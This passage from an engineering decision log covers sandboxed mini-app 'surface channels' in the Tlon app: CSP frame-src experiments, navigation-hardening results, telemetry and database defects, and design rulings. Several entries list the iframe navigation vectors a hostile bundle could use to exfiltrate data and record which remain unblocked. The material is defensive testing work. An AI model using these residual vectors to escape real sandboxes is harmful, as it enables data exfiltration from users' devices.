  (DraftInputId.none). The none-input maps to the existing
  EmptyNotesRenderer null composer — no new composer surface. The
  renderer dispatches through the existing exhaustive
  BUILTIN_COLLECTION_RENDERERS record.
- **D40: Theme mapping.** The shell knows light/dark only. Host maps the
  tamagui theme name: {dark, dracula, gruvbox} plus a name-contains-
  "dark" heuristic → dark; everything else light. Exotic themes get the
  nearer of the two until shell tokens grow variants.
- **D41: Native hosts are written but UNVERIFIED, and say so.** The RN
  WebView host mirrors the web host through the shared session; every
  device-only behavior carries a greppable `SURFACE-NATIVE-VERIFY`
  marker (transport: inbound delivered by dispatching a window
  MessageEvent via injectJavaScript, because RN postMessage historically
  targets document on iOS vs window on Android; srcdoc/baseUrl: CSP meta
  application under `source={{html}}`; egress:
  `onShouldStartLoadWithRequest` vetoes NAVIGATIONS only — real deny-all
  needs WKContentRuleList / shouldInterceptRequest native modules that
  react-native-webview props cannot express; capabilities: storage/file/
  media props). No native sandbox verification is claimed anywhere.
- **D42: §8 exclusion is a paired predicate.** `isSurfaceChannel` (JS)
  and a `NOT LIKE '%tlon.r0.collection.surface%'` fragment over the JSON
  config text column (SQL) are defined side by side so they can't drift.
  Application: getChats zeroes surface channels' unread rows and
  subtracts the surface contribution from the backend-precomputed group
  counts at read time (floored at zero); getNotifyingUnreadSourceCount
  excludes surface channel/thread rows; SQL-shaped activity queries
  filter via a channels join; relational-API activity queries post-filter
  (their pages can come back shorter than the limit); ChannelListItem
  guards the badge for models from any query. Channel-less events
  (contact, group-level) always pass. Deps arrays gain `channels`
  wherever the exclusion reads channel config. Accepted §8 boundaries,
  recorded not hidden: the group-level `notify` flag stays
  backend-authored (its cause is unknowable client-side), so a group
  whose only notifying child is a surface channel can still light the
  app-badge count; and the LIKE match is substring-based over the config
  JSON — the renderer-id namespace makes false positives implausible,
  but it is a textual, not structural, match. Server-side kind-aware
  activity remains the v1 fix.

### Found, flagged, not fixed (out of scope)

- `activity_event_contact_group_pins`' foreign key targets
  `activity_events(id)`, but that table's real primary key is
  `(id, bucketId)`. Under an enforcing `foreign_keys` pragma (as in the
  shared test db), any statement that makes SQLite resolve that FK —
  `insertActivityEvents`' upsert arm, multi-row inserts — fails with
  "foreign key mismatch". Production connections appear not to enforce
  the pragma, which is why this has never bitten. The §8 tests seed with
  plain per-row inserts to sidestep it; the schema defect itself is
  session-1-through-3-independent and predates this branch.

### Least sure about (flag for review)

- The posture test proves what a browser can observe from inside and
  beside the sandbox; it cannot prove the absence of channels the
  browser doesn't expose. The CSP-meta + opaque-origin design is belt
  and suspenders, not a formal proof.
- Group-count subtraction happens in getChats only; group models reaching
  GroupListItem from other queries would show the backend count. The
  sidebar (the group badge's home) reads getChats, so this is currently
  moot — but a future group-badge surface needs the same subtraction.
- `checkActivityEmpty` now means "no non-surface activity", which is the
  §8-correct reading of "empty" for the activity screen.

## Notes for Session 5+ (tlon-skill, templates, publish gate)

- **Serving fixture bundles:** the host fetches `spec.bundle.assetRef`
  with a plain `fetch()` OUTSIDE the sandbox and hash-verifies through
  `getOrFetchBundle` before anything executes. Any HTTP URL the client
  can reach works — a local static server is fine for development; the
  256 KB size cap is enforced pre-fetch (spec sanity) and the sha256
  post-fetch (authority).
- **What the bot must write for a channel to render as a surface:** the
  channel's content configuration must set collection renderer
  `tlon.r0.collection.surface` AND draft input `tlon.r0.input.none`, and
  the description payload must carry the `surfaceSpec` subtree. The
  renderer keys §6 states off `surfaceSpec` (readSurfaceSpec at every
  read) and §8 exclusion off the content configuration — set both.
- **Invoke expectations for `surface event` tooling:** client invokes
  arrive as one-entry `mode: 'invoke'` blobs under kind tail
  `surface/event` with fallback Story text; `specRevision` is stamped by
  the posting client from the spec it rendered. Stale-revision invokes
  are the bot's to resolve per the ratified reducer rules (§4.3) —
  clients already drop stale invokes that never left the sandbox, but a
  revision can flip mid-flight.
- **Web demonstration path:** `pnpm build:surface-shell` at root, then
  `pnpm e2e:sandbox` in apps/tlon-web (no ships) runs the hostile-bundle
  posture test AND the poll fixture end-to-end through the real host
  document (render → state re-render → tap → invoke → permission-off
  disables). Extend that spec when templates need browser-level checks.
- **Native work is a device checklist, not a code task:** grep
  `SURFACE-NATIVE-VERIFY` for the four marker sites; none can be cleared
  from a laptop. The egress marker in particular needs a native-module
  decision (WKContentRuleList / shouldInterceptRequest) before any
  native ship.
- **Cosmos fixtures** exist for every §6 state
  (`packages/app/fixtures/SurfaceChannel.fixture.tsx`) and render the
  real state components; the ready-state fixture documents the shared
  rendered-state scenarios in comments.

## Session 4.5 decisions (fix batch + the frame-src experiment)

- **D43: The `frame-src` experiment (F1 option D) — hypothesis HOLDS.** A
  `frame-src` allowlist on the **host page** blocks the sandboxed iframe's
  self-initiated navigation **pre-flight** on all three engines. Measured,
  not assumed (`apps/tlon-web/sandbox-posture/navigation.spec.ts`;
  `SANDBOX_ENGINES=all`, 111 tests).

  | host-page config                          | chromium    | firefox     | webkit      | srcdoc loads? |
  | ----------------------------------------- | ----------- | ----------- | ----------- | ------------- |
  | A — no CSP (production today)             | NOT blocked | NOT blocked | NOT blocked | yes           |
  | header `frame-src 'none'`                 | pre-flight  | pre-flight  | pre-flight  | **yes**       |
  | header `frame-src 'self'`                 | pre-flight  | pre-flight  | pre-flight  | yes           |
  | header `frame-src https://example.com`    | pre-flight  | pre-flight  | pre-flight  | yes           |
  | header `frame-src <attacker>` _(control)_ | NOT blocked | NOT blocked | NOT blocked | yes           |
  | meta `frame-src 'none'`                   | pre-flight  | pre-flight  | pre-flight  | yes           |
  | meta `frame-src <attacker>` _(control)_   | NOT blocked | NOT blocked | NOT blocked | yes           |

  Cells are identical across all four probes (`location.replace`,
  `location.href =`, anchor click, `document.write` meta-refresh); that
  uniformity is itself asserted, so a future per-vector divergence fails
  the suite.

  - **Q2 (the one that decides usability): `about:srcdoc` frames still
    load and run under `frame-src 'none'` on all three engines** — srcdoc
    is not a network fetch, so it is exempt from `frame-src`. The
    restriction costs us nothing.
  - **Q3: pre-flight.** Ground truth is the attacker's own HTTP server
    logging zero connections — not merely an absent Playwright event.
    Nothing left the device, so the URL-borne payload never escaped.
    Late/commit-stage blocking would have been useless here, since the
    URL _is_ the exfiltration.
  - **Q4:** `'none'`, `'self'`, and an allowlist excluding the attacker
    behave identically; allowlisting the attacker lets it through on the
    same delivery mechanism, which is what attributes the blocking to
    `frame-src` source matching rather than to the page merely carrying
    a CSP.

  **Methodology, deliberately stronger than the original posture spec**
  (and the standard for future leak tests): a real attacker HTTP server
  replaces the `.invalid` host, because an unresolvable host cannot
  distinguish "CSP blocked it" from "DNS failed"; every probe posts
  `probe-armed` before navigating, so a frame that never loaded cannot be
  mis-scored as blocked; and every blocking config is paired with an
  allowlist-the-attacker control.

  **Engine divergence, recorded and asserted:** after a blocked
  navigation Chromium commits an error page _into the sandbox frame_,
  destroying the running app; firefox and webkit leave it on
  `about:srcdoc` and the app keeps running. Neither leaks — on Chromium a
  hostile bundle can only DoS itself.

  **Known-untested residual:** redirect chains from an allowlisted origin
  to an attacker origin. Any non-empty allowlist reintroduces a hop, so
  this must be measured before anyone calls the hole closed. Also
  untested: `data:`/`blob:` navigation targets. (`window.open` and
  top-level navigation are already blocked by the withheld
  `allow-popups` / `allow-top-navigation` tokens.)

  **Enforcement flip criteria** — the enforcing `frame-src` may be turned
  on only when all of: (1) the allowlist demonstrably covers every
  legitimate frame in the app, verified against Report-Only violation
  reports from real usage, not just static enumeration; (2) the redirect
  residual above has been measured; (3) a rollback path exists that does
  not require a full client release. Until then the enforcing policy
  ships written-but-disabled.

  This upgrades the web posture from "gate is the only boundary against
  navigation egress" to "gate plus origin-restricted navigation," but does
  **not** retire the Worker-realm migration: `frame-src` restricts where a
  frame may navigate, not whether unpinned code can run in it, and it
  depends on a host-page policy that a future deployment change could drop
  silently. M4 stands as recorded in D36 and the amended plan §5.

### Found, flagged, not fixed (session 4.5)

- **`setChannelVolumeLevel` rolls back only when a previous setting
  existed.** `packages/shared/src/store/activityActions.ts` (~line 351):
  the catch restores `existingVolumeSetting` guarded by
  `if (existingVolumeSetting)`. For a channel with no prior setting — a
  freshly discovered one, or any channel a user mutes for the first time
  — a failed poke leaves the optimistic `hush` row in the local DB while
  the ship still says default-notify: the UI shows "muted" and pushes
  keep arriving. `muteThread`/`unmuteThread` in the same file handle this
  correctly via `db.clearVolumeSetting(...)`, so the fix is a small
  `else` branch with in-file precedent.

  Pre-existing and shared with the UI mute button, so **not** fixed here:
  it changes shipped mute behavior and is orthogonal to surface channels.
  F4 does not depend on that local row being correct — the actual
  suppression is the ship-side volume map, and F4's marker correctly
  stays unset on a failed poke so the next discovery retries.

- **D44: Host-page CSP — Report-Only has no production delivery.
  (Supersedes D43's flip criteria.)** A STOP finding, reported rather than
  worked around.

  `tlon-web` ships as a **glob served by `%docket`**, whose
  `+payload-from-glob` returns `index.html` with exactly one header
  (`content-type`); the runtime-cache path hardcodes the same. `%docket`
  is **not in this repo** — `peru.yaml` vendors only docket's
  `lib`/`mar`/`sur`, never `app/docket.hoon` — so no repo-local change can
  add a response header. And CSP3 §3.3 excludes
  `Content-Security-Policy-Report-Only` from `<meta>` delivery (along with
  `report-uri` and `frame-ancestors`).

  Therefore: **the enforcing `<meta>` is the only production mechanism
  that exists.** It is written and gated off behind `ENFORCE_HOST_CSP`
  (a one-line flip, proven through the real build path), and deliberately
  NOT shipped this session. Report-Only runs on the Vite dev and preview
  servers, which is a genuine validation surface — the e2e suite runs
  against `dev-no-ssl` and the production-build smoke path against
  `vite preview`.

  **The allowlist is `frame-src 'self' https://tlon.network`** — one
  entry, exhaustively enumerated: `ManageAccountScreen`'s iframe (a
  hardcoded constant, no per-environment variation). The mini-app sandbox
  is `srcdoc` and measured exempt; the composer's webview shim renders
  `srcDoc` and never `src`; every `window.open` site opens a top-level
  context, which `frame-src` does not govern and for which the policy must
  NOT be widened.

  **Amended flip criteria** (D43's criterion 1 assumed production
  Report-Only telemetry that cannot exist):
  1. Clean Report-Only runs across the dev/e2e surface — **but note this
     is only evidence if something observes violations. Nothing collects
     them today; a violation listener must be wired before a clean run
     may be cited.** Otherwise "no reports" means "nobody looked."
  2. The D43 redirect residual measured (an allowlisted origin
     redirecting to an attacker origin).
  3. Accept that **production enforcement failures are silent**: with no
     `report-uri` available in `<meta>`, an allowlist gap surfaces as a
     broken feature, not a report. This is the strongest argument for
     gathering evidence before the flip, and it replaces D43's
     "verified against real-usage reports," which is unachievable.
  4. Rollback is a glob redeploy, not a client release — faster than an
     app-store cycle, but not instant. State it accurately when planning.

  **Chromium consequence of flipping** (measured, `navigation.spec.ts`):
  a refused navigation commits an error page _into_ the sandbox frame,
  destroying the running mini-app; firefox and webkit leave it on
  `about:srcdoc`. Nothing leaks either way — a hostile bundle can only
  self-destruct its own surface — but it is a real behavioral consequence
  of enforcement, not a reason against it.

- **D44 AMENDMENT (session 6d): the flip criteria are met, and the flip
  happened.** D44 recorded the enforcing `<meta>` as "written and gated off
  behind `ENFORCE_HOST_CSP` … deliberately NOT shipped this session." That
  was true when written and is now two sessions stale; `ENFORCE_HOST_CSP =
  true` in `apps/tlon-web/hostCsp.ts`, and the same stale sentence had to be
  corrected in five other places (D171.5, D186). Against the four amended
  criteria:

  1. **Met.** A `SecurityPolicyViolationEvent` listener is wired
     (`apps/tlon-web/src/logic/hostCspViolations.ts`, feeding telemetry under
     the F6 rules), so a clean Report-Only run is evidence rather than
     "nobody looked"; the flip followed a Report-Only pass over the full e2e
     suite that drained 101 pages with zero violations.
  2. **Met, D171.3.** The redirect residual is measured on all three engines:
     an allowlisted origin answering with a 302 to a non-allowlisted one is
     refused at the destination, with a both-origins-allowlisted control
     proving the hop is reachable. Open since session 4.
  3. **Accepted, unchanged.** Production enforcement failures are still
     silent — `report-uri` is still unavailable in `<meta>`. The violation
     listener covers dev and preview, not production.
  4. **Accepted, unchanged.** Rollback is a glob redeploy.

  What D44 did not list and remains open: `data:` / `blob:` navigation
  targets, the other half of D43's residual. And the claim the flip licenses
  is stated precisely in plan §5 now — `frame-src` is an origin allowlist,
  so the guarantee is origin-restricted navigation, never "no navigation".

- **D43 AMENDMENT (after the B-layer landed).** D43 recorded that "cells
  are identical across all four probes ... that uniformity is itself
  asserted." **That is no longer true, deliberately.** The B-layer's
  lexical shadowing (D45 below) blocks two of the vectors in-realm, so
  the suite now asserts a per-vector split, and D43's Config A "NOT
  blocked" row holds only for the _unshimmed_ vectors
  (`window.location.replace`, anchor click, meta-refresh). The `frame-src`
  findings themselves — pre-flight blocking on all three engines, srcdoc
  exempt, controls behaving — are unaffected.

- **D45: In-realm `Location` hardening as specified is impossible; what
  shipped is narrower and labeled as such.** Measured on all three
  engines in a real `sandbox="allow-scripts"` srcdoc frame:
  `Object.getOwnPropertyDescriptor(Location.prototype, 'replace'|'assign'
|'href')` is **absent** — every `Location` member is
  `[LegacyUnforgeable]`, living as a non-writable, non-configurable **own**
  property of the instance. `defineProperty` throws, assignment silently
  fails, `delete` returns false, and `window.location` is itself
  non-configurable so the object cannot be swapped. A "freeze the Location
  prototype" patch would have been **dead code that reads like
  protection** — the exact failure mode F1 taught us to avoid.

  What ships: lexical shadowing of the bare `location` identifier inside
  the bundle's own function scope, plus replacing `window.open` (the one
  writable navigation-adjacent global, and already inert because
  `allow-popups` is withheld). Post-mitigation matrix under Config A (no
  host CSP — the production posture, since D44's policy ships gated off),
  identical on all three engines:

  | probe                                | result              |
  | ------------------------------------ | ------------------- |
  | `location.replace` (bare identifier) | blocked by the shim |
  | `location.href =` (bare identifier)  | blocked by the shim |
  | `window.location.replace`            | **NOT blocked**     |
  | anchor click (`target="_self"`)      | **NOT blocked**     |
  | `document.write` meta-refresh        | **NOT blocked**     |

  A `nav-window-location` probe was added specifically so the suite
  asserts this residual rather than implying containment; the two shimmed
  vectors read blocked in _every_ config including the
  allowlist-the-attacker controls, which is what proves the shim rather
  than the policy is responsible.

- **D46: Teardown premise is measured, not assumed.** The host tears the
  iframe down on any post-initial `load`. "Initial" is defined **per DOM
  element** (a ref holding the node whose first load was seen), so an
  intentional revision remount — a different node — cannot be confused
  with self-navigation. This depends on never reassigning `srcDoc`
  in place, which is now measured: assigning `srcdoc` to an
  already-inserted element fires **2** loads on chromium/webkit (1 on
  firefox), indistinguishable from self-navigation, while React's
  set-before-insert fires **1**. Pinned per engine so the premise fails
  the suite rather than rotting silently.

### Follow-ups opened this session (not actioned)

- **Native has no teardown equivalent.** `sandboxSession`'s "second
  `ready` re-inits" path is now effectively unreachable on web (teardown
  fires first) but remains live on native, which got only the
  invoke-binding fix. A WebView teardown is device-verification
  territory — add it to the `SURFACE-NATIVE-VERIFY` checklist.
- **A torn-down surface renders a blank pane.** No §6 state covers "this
  app was shut down"; worth a defined state, though it only triggers on
  hostile navigation, which a gate-approved bundle should never do.
- **No CSP violation listener exists** (see D44 criterion 1) — a clean
  Report-Only run is not evidence until something observes violations.

- **D47: `trackError` custom props silently clobber reserved telemetry
  fields — repo-wide, not surface-specific.** `createDevLogger`'s
  `trackError` builds the PostHog/Sentry payload and spreads
  `...customProps` **last** (`packages/shared/src/debug.ts` ~line 303),
  after `message`, `errorMessage`, `breadcrumbs`, `logLevel`,
  `jsContextId`, and `buildInfo`. Any caller passing one of those keys
  overwrites the event's own field. **27 call sites across
  `packages/api` and `packages/shared` pass such a key.**

  For surface this was live: the shell-error branch passed
  `message: <sandbox-supplied string>`, so **attacker-chosen text became
  the telemetry event's own message**, not merely an attached property.
  F6 fixes the surface call site (the bounded detail now rides under
  `detail`), but the underlying footgun is untouched — the next caller to
  pass `message:` reintroduces it silently, with no type error.

  Follow-up worth filing: either spread `customProps` **first** so
  reserved fields win, or namespace them under a single `props` key.
  Deliberately not changed here — it alters the shape of every existing
  error event and belongs in its own reviewed change, not inside a
  surface-channels fix batch.

- **D48: Mutation M12 survived, and the test was kept anyway.** The
  writer-side "an inherited name is not resolvable as a declared action"
  test does not discriminate _which_ gate rejects it: `ActionIdSchema`'s
  charset (`/^[a-z0-9-]+$/`) plus its forbidden-key refinement already
  make `constructor` the only expressible prototype member and reject it,
  so replacing `getDeclaredAction` with a naive lookup still passes. The
  test asserts the outcome rather than the mechanism, which is the right
  thing to assert at that layer — the bridge schema has **no** such
  refinement, and the session-side equivalent (M2) does discriminate.
  Recorded because a surviving mutation is evidence about what a test
  proves, and silently keeping it would be the failure mode
  `feedback_mutation_testing_limits` warns about.

- **D49: Byte identity survives the real `%groups` round trip — verified
  against Hoon for the first time.** Until now the guarantee had only been
  proven against the TS encode/decode pair. The seed writes nine specs
  through the production description path and compares them byte-for-byte
  against what a raw `%groups` scry returns, with no client-side
  transform in between. **No mutation of any kind.** One spec carries a
  deliberate torture payload: NFD vs NFC of the same grapheme, a ZWJ emoji
  with skin-tone modifier, CJK, RTL, leading/trailing whitespace,
  tabs/CRLF, JSON escape characters, deliberately unsorted keys, varied
  number formats, empty string/object/array, deep nesting. All survived.
  NUL and lone surrogates were excluded on purpose — they are not
  representable in a `@t` cord, so a "failure" there would say nothing
  about the guarantee.

- **D50: A deleted channel's name is burned on that ship (backend
  finding, not ours to fix here).** `store.deleteChannel` pokes only
  `%groups`. `%channels-server`'s `ca-create` opens with
  `?: (~(has by v-channels) n)` → `(slog "create already exists")` → a
  **silent no-op**. So re-creating a previously used name leaves the
  channel half-created: `%channels` holds an entry with the bunt flag
  `~zod/`, `%groups` never lists it — and **the client's tracked poke
  still resolves successfully**, so the client believes it worked.
  Reproduced in isolation. The app only dodges this because
  `createChannel` uses random slugs unless `customSlug` is passed; the
  seed was redesigned around it (reuse channels, clear posts). Worth
  filing upstream — the silent success is the dangerous half.

- **D51: `~` in a JSON Pointer segment must be escaped — an authoring
  trap for the templates session.** A host op with path
  `/entries/~sampel-palnet` was silently skipped: `~` is RFC 6901's escape
  character, so a bare `~s` is an invalid escape. The correct segment is
  `~0sampel-palnet`, which is exactly what `$actor` substitution already
  produces (§7). The reducer behaved correctly — it skipped only the
  offending op — but any hand-authored spec using a ship name as a
  literal pointer segment will hit this. **The authoring skill's
  action-design guidance and the publish gate should both cover it**;
  prefer `$actor` over a literal ship wherever possible.

- **D52: Hostile navigation measured on the shipping host page.** With
  the dev server's Report-Only policy live: the shimmed vectors
  (`location.replace`, `location.href`) do nothing; the unshimmed ones
  (`window.location.replace`, anchor click, meta-refresh) **do navigate**,
  the browser logs `…violates the following report-only CSP directive:
"frame-src 'self' https://tlon.network". The violation has been logged,
but no further action has been taken.`, and the host then tears the
  iframe down. This is exactly D43+D44+D45 composing as recorded — and it
  confirms concretely that under Report-Only the request still leaves the
  device. Only the enforcing flip changes that.

- **Also confirmed:** the `activity_event_contact_group_pins` composite-PK
  foreign-key mismatch recorded in session 4 reproduces here on group
  delete under an enforcing `foreign_keys` pragma. Independent
  confirmation of a pre-existing defect, still not ours to fix.

- **D53: A post's id is a host-stamped `@da`; `sentAt` is not (and the
  naming misleads).** Verified today while scoping a `$now` substitution.

  `%channels-server`'s `%add` arm sets the post id to **`now.bowl`** — the
  _host ship's_ clock at the moment it processes the poke — with a
  collision loop bumping by `~s1/2^16` until free
  (`desk/app/channels-server.hoon:1089`), and `desk/sur/channels.hoon:75`
  types `id-post` as `time`. So the id **is** a timestamp, and it is
  server-authoritative: a member cannot forge it, exactly as they cannot
  forge `post.authorId`. The client already derives it —
  `getReceivedAtFromId` → `udToDate` (`packages/api/src/client/postsApi.ts:1421`).

  **The trap:** the client model's two time fields are the reverse of
  what their names suggest.
  - `receivedAt: getReceivedAtFromId(id)` (`postsApi.ts:1385`) — id-derived,
    host-stamped, **trustworthy**.
  - `sentAt: post.essay.sent` (`postsApi.ts:1384`) — the `sent` field the
    **sender** wrote into the essay, **forgeable**.

  Any future `$now`/`$date` substitution (§12) MUST derive from the id.
  Implementing it against `sentAt` — the obvious-looking field, with the
  right-sounding name, sitting one line away — would let a member
  backdate or postdate their own entries, reintroducing the forgery the
  parameterless-invoke design exists to prevent. Recorded here rather
  than only in the plan because this is a fact about the codebase that
  the next implementer can get wrong in a single keystroke.

  Corrects an earlier claim of mine in conversation that surface apps
  "cannot know when" something happened. The information exists and is
  trustworthy; it is simply not plumbed into reduced state yet, because
  op values are spec literals.

- **D54: `append` cannot be made idempotent inside v0, and the honest
  answer is an app-design pattern, not a mechanism.** Design analysis of
  the duplicate-invoke problem (double-tap, transport retry, same user on
  two devices; hand-crafted duplicate posts are spam, bounded by writer
  perms and the state cap, not a correctness issue).

  **Why it is unfixable in-language:** members supply no values, so two
  duplicate appends produce **byte-identical entries** — nothing
  downstream, render or bot or human, can distinguish a double-tap from
  two legitimate entries from state alone. The backend offers no help:
  `%add` stamps a fresh `now.bowl` id per poke with no `(author, sent)`
  dedup (`desk/app/channels-server.hoon:1086-1093`), so a retry is
  genuinely two posts. And the distinguishing datum is not even reachable
  at fold time — `SurfacePostView`
  (`packages/api/src/client/surface/reducer.ts:39-45`) carries
  `authorId`/`sequenceNum`/`isEdited`/`isDeleted`/`blob` and **no id**.

  **v0 answer (no reducer change):** shell-side invoke debounce as
  standard shell behavior; and the **host-is-the-clock** pattern in the
  authoring skill — the member does an idempotent
  `set /today/$actor …`, the host posts a rollover event
  (`set /history/<date> <copy of /today>` + `del /today`) computing date
  and value from its own fold. Two ops, under caps, fully idempotent,
  dated history, no `append` anywhere. Degrades gracefully: a missed
  rollover just stretches "today". §4.3's guidance was corrected — "key
  appended records by `$actor`" under-states the problem, since keying
  the path by actor does not dedupe _repeated_ appends by that actor.
  In v0, `append` in a member action means "duplicates acceptable."

  **v1 answer: `$period` substitution** (see §12) — bucketed from the
  host-stamped id, both substitution sites, **fixed-offset integer
  arithmetic only; never viewer timezone (divergence) and never IANA
  named zones (tzdata skew across clients)**. Cleanest §6 story of the
  options considered: duplicates become literal no-ops, so deletion and
  edit-retraction of either duplicate is a state no-op and snapshots
  finalize normally.

  **Rejected: reducer-internal debounce bookkeeping.** It convergently
  dedupes within a post set, but "when did this actor last invoke" lives
  outside reduced state, so it is **lost at the snapshot boundary** — a
  duplicate pair straddling the boundary silently folds both, failing
  exactly where it cannot be observed. Fixing that means putting the
  markers in state, which is the `oncePer` design; the reserved-subtree
  variant is therefore strictly better than the bookkeeping one. Also
  rejected: a client-supplied idempotency nonce — a member-supplied wire
  value, and it only addresses transport retries anyway.

- **D55: v0's constraints push generated apps to narrate their own
  mechanism, and the gate cannot catch it.** Found by reading the workout
  fixture's UI on a phone, not by any test.

  The fixture shipped user-facing copy reading _"lifts logged since the
  last rollover"_ and _"Clearing removes only your own scratch entries"_,
  with empty states referring to _"No rollover has happened yet"_. Both
  are accurate. Both expose internal vocabulary no lifter should ever
  meet.

  **The cause is a real constraint, correctly handled and badly worded.**
  `render` must never call `Date` — the sandbox clock belongs to the
  _viewer_ while the archive boundary belongs to the _host_, so a viewer
  in a different timezone reading "today" would be looking at a lie. The
  author chose a technically-true label over a friendly-but-wrong one,
  which is the right instinct and the wrong words. "This session" is both
  true and natural, requires no date, and matches how the domain already
  talks.

  Recommended replacements, as a model for the class:
  _"since the last rollover"_ → _"this session"_; _"your own scratch
  entries"_ → _"your own entries for this session"_; _"Archived sessions
  appear here after the first rollover"_ → _"Your past sessions will
  appear here"_; _"No rollover has happened yet"_ → _"No sessions saved
  yet"_.

  **This is a class, not an instance.** Every v0 constraint that shapes
  behavior — no in-app date, host-driven archiving, no viewer identity,
  parameterless actions — invites a generating model to hit the wall,
  describe it accurately, and ship jargon. Left alone, each generated app
  invents its own internal vocabulary.

  **The publish gate cannot detect this**: the style lint covers
  `font-family`, non-token colors and non-whitelisted style properties —
  nothing about whether copy makes sense to a human. So the control has
  to be `PARADIGM.md` carrying a **vocabulary section** next to the
  technical rules, and the templates modelling the words rather than
  leaving each generation to coin them. An authoring-session deliverable.

- **D56: Open question — a bundle-hash change at an unchanged
  `specRevision` did not reach a running client.** Found while updating
  the workout fixture's copy mid-demo, and not fully diagnosed.

  Sequence: the bundle's bytes changed, the seed republished the spec
  with the new `sha256` (verified by scry: the ship held the new hash),
  and `specRevision` stayed at 1. The running iOS client kept rendering
  the **old** bundle. Bumping to revision 2 fixed it immediately.

  This sits awkwardly against §3, which says **"the current content of
  that cell is authoritative, full stop"** and that `specRevision` is for
  correlating events and snapshots, _not_ a cache key. If a client can
  miss a change to the authoritative cell because a correlation number
  did not move, then either the client is wrong or §3 overstates.

  Both plausible mechanisms are unverified: the client may not have
  re-synced the channel description at all, or it may have re-synced and
  then served the old bundle from the content-addressed cache under the
  spec it already held. **Deliberately not guessed at** — distinguishing
  them needs an actual repro.

  Two follow-ups: (1) determine which, and fix the client if it is the
  client; (2) independently, the **seed must bump the revision whenever
  the bundle bytes change**, which is what `surface publish` is already
  specified to do (§9). The seed silently violated that and it cost a
  demo cycle. A hardcoded bump is in place; deriving the revision from
  the bundle hash would make the class of mistake unavailable.

- **D57: Judgment calls in the Sol round-2 fix pass.** Recorded because
  each was a choice not to do the obvious thing.

  - **No `allowLower` escape hatch on the head watermark.** Making
    `setLatestChannelSequenceNum` an atomic maximum removes the ability to
    lower it. All three callers write a server-reported `newest`, and no
    channel-reset or nuke path uses this setter — `updateChannel` is the
    explicit reset path, and a test documents that. An escape hatch
    "just in case" would have reopened the defect for whoever used it.
  - **No `detailLength` in shell-error telemetry.** Having removed the
    truncated `detail`, the tempting compromise is to keep a length for
    debugging. A message length is still a low-bandwidth
    attacker-controlled channel, so the payload carries only
    host-derived values.
  - **Restructuring beat testing** for the surviving mutation. Deleting
    the marker-authority declaration left all 615 tests passing, silently
    in the never-hush direction. Rather than adding a test to cover the
    gap, the mirror write and the declaration were collapsed into one
    call so the omission is inexpressible. A test would have caught that
    one mutation; the restructure removes the shape of the mistake.

- **D58: Judgment calls in the chart primitive.**

  - **Aspect-ratio box, not a height prop.** A pixel height is exactly
    the dimension being removed — one number an author guesses against an
    unknown viewport, where the guess that looks right on desktop is the
    one that breaks on a phone. Floor and ceiling bound the box
    (`maintainAspectRatio: false` will happily draw into zero height).
  - **Responsive options applied AFTER the caller's**, so a bundle cannot
    opt back into a fixed canvas through the primitive. The broken path
    is unreachable rather than discouraged — the same discipline as the
    reducer taking ops from the spec rather than the message.
  - **Constructor injected, not imported**, so the kit keeps no hard
    `chart.js` dependency, tests can stub it, and a chart-free shell
    renders an empty state instead of throwing.
  - **`surface.Chart` (raw) retained.** Removing it is a breaking change,
    so the escape hatch — and therefore the residual way to write the
    broken version — remains. This is why the gate check must be
    behavioral (§9) rather than relying on the primitive's existence.
  - **Guarded `chart.update()`.** Chart.js's documented clean degradation
    covers construction only; `update()` with no 2D context throws, and
    the effect runs inside `render()`, so an escaping throw would replace
    the whole app with the broken-state view — worse than the old bundles,
    which never called `update`. Falls back to destroy-and-rebuild.
  - **Left alone: theme flips don't recolor a drawn chart.** The harness
    sets `data-theme` without re-rendering, so a canvas keeps its colors
    until the next state update. Pre-existing, and the fix is a harness
    behavior change; not folded into a primitive change.

- **D59: D56 resolved — the mechanism was not the one hypothesised, and
  the ruling still holds.** `insertGroups`' `onConflictDoUpdate` allowlist
  (`packages/shared/src/db/queries.ts`) listed `description` and
  `contentConfiguration` — both **derived** from the description cell —
  while omitting `descriptionPayload` (the verbatim cell) and
  `surfaceSpec`. It is the only write carrying group-channel metadata on
  a boot or full group sync, so once a channel row existed it refreshed
  the readable description and the renderer config while **pinning the
  raw payload and the app definition** to whatever they held when the row
  was created. Two writers of the same table disagreed:
  `insertChannelsInternal` uses `conflictUpdateSetAll` with explicit
  exclusions and was always correct; `insertGroups` hand-listed columns
  and drifted.

  **D56 guessed wrong about the cause.** The bumped-revision case failed
  identically before the fix, so the swallow was never keyed on
  `specRevision` — it dropped the whole cell. What made "bump the
  revision" appear to fix it during the demo was a _different carrier_
  landing the change: the live `r-groups` edit fact spreads the full
  channel into `db.updateChannel`, which does write both columns. With a
  live SSE connection in the foreground it lands; recovering via init or
  group sync it never does. Both candidate mechanisms D56 recorded are
  now settled — the first confirmed and reproducible, the second (a stale
  content-addressed bundle cache) ruled out, since `useSurfaceBundle`
  keys on `sha256` and a new hash is a miss by construction.

  Worth keeping as a lesson: the demo-time "fix" was a **coincidence of
  transport**, and had we accepted it as the explanation we would have
  shipped a bump-the-revision workaround around a bug that drops the cell
  entirely. Diagnosing before fixing was what separated them.

  **The second consequence was worse than the reported one.**
  `channelActions.updateChannel` rebuilds the outgoing description from
  `currentChannel.descriptionPayload`, so a stale payload meant any
  routine metadata edit — a rename, a privacy change — pushed the
  **superseded spec back onto the ship**, reverting a bot's republish on
  the authoritative cell. The reported symptom was a client rendering
  stale; the unreported one was a client silently corrupting shared
  state.

  §3 amended accordingly (on-branch): change detection keys on cell
  content, and every write carrying channel metadata must refresh the
  verbatim payload and the spec, not only the fields derived from them.

## Session 5 decisions (tlon-skill: the `surface` commands, gate, preview, templates)

- **D60: the plan is now committed on-branch, superseding D1.** Session
  5's prompt treats `surface-channels-plan.md` as canonical on the branch
  and directs amendments to be applied there. D1 had kept it untracked
  alongside the handoff prompts; that no longer holds. The plan and the
  code are now reviewed against each other, and amendments have a history
  instead of living only in a working copy. Session prompts, reports and
  the review logs stay untracked as before.

- **D61: the sandbox document assembler lives in `packages/surface-shell`,
  not in `packages/app`.** It moved to `src/sandbox/document.ts`, exported
  as `@tloncorp/surface-shell/sandbox`, and `packages/app` now imports it
  from there. Nothing about the assembly changed — CSP meta, nav guard,
  shell-first ordering, `</script` escaping and the bundle wrapper are
  byte-for-byte what they were, and the browser posture suite (47
  chromium) passes with only its import path edited.

  The reason is the same one that puts the reducer in `@tloncorp/api` and
  the protocol schemas here: `tlon-skill`'s preview and the publish gate's
  smoke render have to run the **identical** function, not an equivalent
  one. A second copy would make "preview equals production" a claim
  maintained by convention, which is the class of guarantee that holds
